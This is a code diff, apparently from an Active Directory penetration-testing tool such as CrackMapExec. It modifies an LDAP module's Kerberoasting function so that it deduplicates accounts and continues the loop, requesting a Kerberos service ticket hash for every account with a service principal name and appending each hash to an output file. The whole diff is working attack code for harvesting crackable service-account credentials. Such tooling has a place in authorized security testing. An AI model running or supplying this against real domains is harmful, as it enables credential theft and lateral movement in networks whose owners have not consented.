@@ -19,6 +19,8 @@ from impacket.ldap import ldap as ldap_impacket
 from impacket.krb5 import constants
 from impacket.ldap import ldapasn1 as ldapasn1_impacket
 from io import StringIO
+from pywerview.cli.helpers import *
+from pywerview.requester import RPCRequester
 
 ldap_error_status = {
     "533":"STATUS_ACCOUNT_DISABLED",
@@ -677,24 +679,26 @@ class ldap(connection):
                     pass
 
             if len(answers)>0:
-                #users = dict( (vals[1], vals[0]) for vals in answers)
                 TGT = KerberosAttacks(self).getTGT_kerberoasting()
+                dejavue = []
                 for SPN, sAMAccountName, memberOf, pwdLastSet, lastLogon, delegation in answers:
-                    try:
-                        serverName = Principal(SPN, type=constants.PrincipalNameType.NT_SRV_INST.value)
-                        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, self.domain,
-                                                                                self.kdcHost,
-                                                                                TGT['KDC_REP'], TGT['cipher'],
-                                                                                TGT['sessionKey'])
-                        r = KerberosAttacks(self).outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName, SPN)
-                        self.logger.highlight(u'sAMAccountName: {} memberOf: {} pwdLastSet: {} lastLogon:{}'.format(sAMAccountName, memberOf, pwdLastSet, lastLogon))
-                        self.logger.highlight(u'{}'.format(r))
-                        with open(self.args.kerberoasting, 'a+') as hash_kerberoasting:
-                            hash_kerberoasting.write(r + '\n')
-                        return True
-                    except Exception as e:
-                        logging.debug("Exception:", exc_info=True)
-                        logging.error('SPN: %s - %s' % (SPN,str(e)))
+                    if sAMAccountName not in dejavue:
+                        try:
+                            serverName = Principal(SPN, type=constants.PrincipalNameType.NT_SRV_INST.value)
+                            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, self.domain,
+                                                                                    self.kdcHost,
+                                                                                    TGT['KDC_REP'], TGT['cipher'],
+                                                                                    TGT['sessionKey'])
+                            r = KerberosAttacks(self).outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName, SPN)
+                            self.logger.highlight(u'sAMAccountName: {} memberOf: {} pwdLastSet: {} lastLogon:{}'.format(sAMAccountName, memberOf, pwdLastSet, lastLogon))
+                            self.logger.highlight(u'{}'.format(r))
+                            with open(self.args.kerberoasting, 'a+') as hash_kerberoasting:
+                                hash_kerberoasting.write(r + '\n')
+                            dejavue.append(sAMAccountName)
+                        except Exception as e:
+                            logging.debug("Exception:", exc_info=True)
+                            logging.error('SPN: %s - %s' % (SPN,str(e)))
+                return True
             else:
                 self.logger.highlight("No entries found!")
                 return
